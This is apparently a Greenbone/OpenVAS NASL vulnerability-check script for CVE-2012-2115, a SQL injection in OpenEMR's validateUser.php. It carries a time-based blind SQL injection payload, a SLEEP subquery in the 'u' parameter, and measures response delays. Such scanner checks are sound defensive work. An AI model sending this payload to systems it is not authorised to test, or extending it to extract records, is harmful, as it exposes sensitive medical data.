CPE = "cpe:/a:open-emr:openemr";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805345" );
	script_version( "$Revision: 11872 $" );
	script_cve_id( "CVE-2012-2115" );
	script_bugtraq_id( 51247 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $" );
	script_tag( name: "creation_date", value: "2015-03-02 15:41:52 +0530 (Mon, 02 Mar 2015)" );
	script_name( "OpenEMR 'validateUser.php' SQL Injection Vulnerability" );
	script_tag( name: "summary", value: "The host is installed with OpenEMR
  and is prone to sql injection vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not." );
	script_tag( name: "insight", value: "Flaw is due to the validateUser.php script
  not properly sanitizing user-supplied input to the 'u' parameter." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data." );
	script_tag( name: "affected", value: "OpenEMR version 4.1.0 and possibly
  earlier." );
	script_tag( name: "solution", value: "Upgrade to version 4.1.1 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2012/Jan/27" );
	script_xref( name: "URL", value: "http://www.mavitunasecurity.com/sql-injection-vulnerability-in-openemr" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_openemr_detect.sc" );
	script_mandatory_keys( "openemr/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "http://www.open-emr.org" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
wait_extra_sec = 5;
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
sleep = make_list( 5,
	 7,
	 9 );
for sec in sleep {
	url = dir + "/interface/login/validateUser.php?u='%2b(SELECT%201%20FROM%20" + "(SELECT%20SLEEP(" + sec + "))A)%2b'";
	sndReq = http_get( item: url, port: http_port );
	start = unixtime();
	rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
	stop = unixtime();
	time_taken = stop - start;
	if(time_taken + 1 < sec || time_taken > ( sec + wait_extra_sec )){
		exit( 0 );
	}
}
security_message( http_port );
exit( 0 );

